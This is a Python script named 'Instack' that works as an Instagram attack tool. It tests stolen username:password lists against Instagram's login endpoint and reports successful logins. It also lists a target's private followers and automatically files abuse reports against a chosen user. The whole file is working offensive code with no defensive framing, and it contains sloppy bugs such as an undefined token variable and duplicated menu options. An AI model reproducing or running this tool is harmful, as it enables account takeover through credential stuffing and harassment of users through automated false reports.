import instaloader
import requests
import os
import random
import string
from colorama import init, Fore, Style
import requests
import random
import time
init(autoreset=True)


print(Fore.YELLOW + '''                                                                           
                                                                                
                                                                                
                                                                                
                               *@@&*         (@@&.                              
                             (@@@@@@@@@@@@@@@@@@@@@.                            
                            @@@@@@@@@@@@@@@@@@@@@@@@(                           
                          .@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@,                        
                        &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                       
                       &@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,                      
                      *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
               ,#&&@@ ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@& *@@&&       
             @@@@@@@@@    .@@@@@@@@@@@@@@@@@@@@@@@@(    *@@@@@@@@%            
             @@@@@@@@@@*          ,/#&&&&&&#*.          &@@@@@@@          
              @@@@@@@@@@@,                           @@@@@@@@@@*             
                @@@@@@@@@@@@@@#,               *@@@@@@@@@@@@@@,               
                   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/                  
                      *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&                      
                           *@@@@@@@@@@@@@@@@@@@@@@@@                         
                                   .,*/((/*,.                                   
                                                                                
                                                                                
                     .......................................                    
                         . ............................                         
                                 Instack                                                     
                                                                                
                                                                                
''')
def check_account(username, password):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest'
    }
    data = {
        'username': username,
        'password': password,
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    response = requests.post(url, headers=headers, data=data)
    if 'userId' in response.text:
        print(f'{Fore.GREEN}Found: {username}:{password}{Style.RESET_ALL}')
    else:
        print(f'{Fore.RED}Invalid: {username}:{password}{Style.RESET_ALL}')

def brute_force(file_path):
    try:
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                username, password = line.split(':')
                check_account(username, password)
    except FileNotFoundError:
        print(f'{Fore.RED}File not found. Please enter the correct file path.{Style.RESET_ALL}')
    except Exception as e:
        print(f'{Fore.RED}An error occurred: {e}{Style.RESET_ALL}')

def find_private_accounts():
    username = input("Enter the Instagram username to check for private accounts: ")
    L = instaloader.Instaloader()
    try:
        profile = instaloader.Profile.from_username(L.context, username)
        followers = profile.get_followers()

        private_accounts = [follower.username for follower in followers if follower.is_private]
        if private_accounts:
            print(f'{Fore.YELLOW}Private accounts found for {username}: {private_accounts}{Style.RESET_ALL}')
        else:
            print(f'{Fore.GREEN}No private accounts found for {username}.{Style.RESET_ALL}')

    except instaloader.exceptions.ProfileNotExistsException:
        print(f'{Fore.RED}The profile {username} does not exist.{Style.RESET_ALL}')
    except Exception as e:
        print(f'{Fore.RED}An error occurred: {e}{Style.RESET_ALL}')
def report_user(username):
    base_url = "https://www.instagram.com/"
    report_url = f"{base_url}report/{username}/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Referer": f"{base_url}{username}/",
        "X-CSRFToken": abc,
        "X-Instagram-AJAX": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    payload = {
        "source_name": "",
        "reason_id": "1",
        "frx_context": "",
        "additional_info": "",
    }

    with requests.Session() as session:
        response = session.get(base_url)
        csrf_token = response.cookies["csrftoken"]
        headers["X-CSRFToken"] = csrf_token
        response = session.post(report_url, headers=headers, data=payload)

    if response.status_code == 200:
        print(f"{username} Reported.")
    else:
        print(f"Error: {response.status_code}")


while True:
    print("\n1. Check Accounts\n2. Brute Force\n3. Find Private Accounts\n4.Auto Account Reporter\n5. Exit")
    choice = input("Please enter an option: ")

    if choice == '1':
        file_path = input("Please enter the file path(username:password): ")
        brute_force(file_path)
    elif choice == '2':
        file_path = input("Please enter the file path: ")
        brute_force(file_path)
    elif choice == '3':
        find_private_accounts()
    elif choice =='4':
    	abc = input("Your CSRF Token: ")
    	user_input = input("User: ")
    	report_user(user_input)
    elif choice == '5':
        print("Exiting...")
        break
    else:
        print(f'{Fore.RED}Invalid option. Please try again.{Style.RESET_ALL}')
